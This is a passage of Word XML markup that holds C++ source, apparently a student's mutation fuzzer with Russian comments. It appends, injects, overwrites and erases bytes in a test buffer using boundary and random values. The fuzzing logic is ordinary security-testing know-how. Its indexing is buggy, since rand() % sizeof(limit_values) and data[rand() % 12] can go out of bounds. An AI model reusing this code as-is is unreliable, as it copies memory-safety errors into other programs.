      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>CHAR_BIT</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, 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short</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&gt;;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9CAFB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action = rand() % 5;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120E1B7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offset = 0, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>limit_value_offset</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 0, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>number_of_iterations</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42411E4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limit_values</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>[] = { 0x00, 0xFF, 0xFFFF, 0xFF - 1, 0xFFFF - 1, 0xFFFFFFFF - 1 };</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5732F5B6" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59092D3E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>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>switch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (action)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50199377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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="003B244F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FF"/>
        </w:rPr>
        <w:t>case</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>// Создание случайного количества байт и добавление в конец имеющегося буфера</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77ECA9A3" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRP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 w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D34C23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lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:tab/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number_of_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = rand() % 3000;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C0C4EEF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std::</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>vector</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;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&gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>random_data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>generate_random_data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number_of_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F3D308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.insert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.end</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">() </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>random_data.data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">(), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>random_data.data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">() + </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>number_of_bytes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="697C18F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break</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D5A44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170CF42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case</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1: </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">// </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>Увеличение</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>буфера</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="66FEDE9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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AAD6A8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.size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>() &lt; 2048)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49DD38BA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>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D6166E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80808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+=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E275227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58773FD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FF"/>
        </w:rPr>
        <w:t>break</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1879983D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0BD22226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FF"/>
        </w:rPr>
        <w:t>case</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>// Подстановка граничного значения для переменных программы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1774B1F2" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRP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 w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72DB55D8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number_of_iterations</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = rand() % 10;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="637943D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for</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t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= 0;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&lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>number_of_iterations</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">;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>++)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E2D73F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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70C790A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limit_value_offset</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = rand() % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>sizeof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limit_values</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3305CF3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  <w:t>offset = rand() % 12;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00EAEB1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808080"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>limit_values</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>limit_value_offset</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F48913D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>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DF8B57E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FF"/>
        </w:rPr>
        <w:t>break</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39576A08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698B84C7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FF"/>
        </w:rPr>
        <w:t>case</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">// Подстановка </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>рандомного</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> значения для переменных программы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2871B843" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRP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 w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DB6A06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number_of_iterations</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = rand() % 10;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5233925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for</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t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= 0;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&lt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>number_of_iterations</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">;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>++)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F82CD8F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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78149D4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limit_value_offset</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = rand() % </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>sizeof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limit_values</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49E2545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  <w:t>offset = rand() % 12;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACAFD4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808080"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>offset</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = rand();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28644F70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lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B4834B6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FF"/>
        </w:rPr>
        <w:t>break</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1AE65D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7F0432C2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FF"/>
        </w:rPr>
        <w:t>case</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 4: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>// Стирание данных из конца файла</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F1C266C" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRP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 w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55FAF77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 xml:space="preserve">offset = rand() % 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.size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17F38DB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erase_size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = rand() % (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.size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>() - offset);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7590228E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.erase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.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">() </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> offset, 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.begin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">() </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>+</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> offset </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>+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erase_size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="358A9E91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>
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>break</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21F1F99E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5B01ED2D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73F4BBD3" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0ED67DC0" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRP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808080"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.size</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>() &lt; 2048)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55A2D80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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6346AE5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808080"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>+=</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="299ABD4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305C5B28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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6221EBDD" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A62716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8000"/>
        </w:rPr>
        <w:t xml:space="preserve">// </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>Генератор</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>псевдослучайных</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>чисел</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3DA62AE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std::</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>vector</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;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&gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>generate_random_data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>size_t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC8C4A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732BE66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std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>random_device</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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rd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76329A56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std::</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>mt19937</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> gen(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>rd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E57D9F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std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>uniform_int_distribution</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;&gt; dis(1, 255);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B50C066" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="43F1FEB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std::</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>vector</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;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char</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&gt; data(</w:t>
      </w:r>
